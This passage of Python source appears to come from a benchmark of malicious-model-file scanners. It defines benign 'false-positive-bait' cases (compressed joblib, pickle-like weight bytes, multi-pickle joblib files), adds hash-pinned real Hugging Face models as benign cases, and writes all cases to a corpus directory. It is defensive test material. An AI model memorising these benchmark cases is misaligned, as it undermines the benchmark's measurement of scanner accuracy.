              "models twice, on two different metadata keys, and was only "
              "found by sweeping the Hub. A vocabulary built from source "
              "text contains source-text substrings by construction.",
        tags=("false-positive-bait", "gguf"),
        build=_benign_code_trained_vocab,
    ),
    Case(
        id="benign-compressed-joblib",
        filename="model.joblib",
        malicious=False,
        technique="An ordinary sklearn payload behind xz compression.",
        origin="quickset",
        notes="Targets the codec handling. Reading compressed joblib is "
              "necessary; treating compression as a signal is not.",
        tags=("false-positive-bait", "joblib"),
        build=_benign_compressed_joblib,
    ),
    Case(
        id="benign-weights-starting-like-pickle",
        filename="model.pkl",
        malicious=False,
        technique="A weights blob whose first bytes coincide with a PROTO "
                  "marker.",
        origin="quickset",
        notes="Targets nested-pickle detection. In a large model, tensor "
              "data beginning 0x80 0x04 is a matter of time.",
        tags=("false-positive-bait", "nested"),
        build=_benign_bytes_that_start_like_a_pickle,
    ),
    Case(
        id="benign-pickle-after-raw-bytes",
        filename="model.joblib",
        malicious=False,
        technique="Two pickles separated by raw array data, as joblib writes.",
        origin="quickset",
        notes="Targets resync. A walk that reads past raw bytes must not "
              "invent findings in the ordinary case, which is every joblib "
              "file ever written.",
        tags=("false-positive-bait", "resync"),
        build=_benign_pickle_after_raw_bytes,
    ),
)


def real_model_cases() -> tuple[Case, ...]:
    """Benign cases backed by real, hash-pinned models that have been fetched.

    Empty until `python -m quickset.realmodels` has run. Skipped rather
    than failed when absent, so the benchmark still works offline -- but a run
    without them is measuring false positives against hand-written pickles
    only, which is much weaker evidence.
    """
    from . import realmodels

    return tuple(
        Case(
            id=model.id,
            filename=model.filename,
            malicious=False,
            technique=f"Real {model.fmt} model from {model.repo}, SHA-256 pinned.",
            origin="real-world",
            reference=f"https://huggingface.co/{model.repo}",
            notes=model.note or (
                f"{model.size} bytes, {model.library or 'no declared library'}, "
                f"HuggingFace scan rollup {model.hf_scan or 'unrecorded'}."
            ),
            tags=("real-model", "false-positive-bait", f"fmt:{model.fmt}"),
            build=lambda m=model: realmodels.cached_path(m).read_bytes(),
        )
        for model in realmodels.cached_models()
    )


ALL_CASES: tuple[Case, ...] = MALICIOUS + BENIGN


def all_cases() -> tuple[Case, ...]:
    """Every case, including real models when they have been fetched."""
    return ALL_CASES + real_model_cases()


def write_corpus(target_dir) -> dict[str, Case]:
    """Materialize every case into `target_dir`. Returns path -> Case."""
    from pathlib import Path

    target = Path(target_dir)
    target.mkdir(parents=True, exist_ok=True)
    written: dict[str, Case] = {}
    for case in all_cases():
        dest = target / case.id / case.filename
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(case.build())
        written[str(dest)] = case
    return written
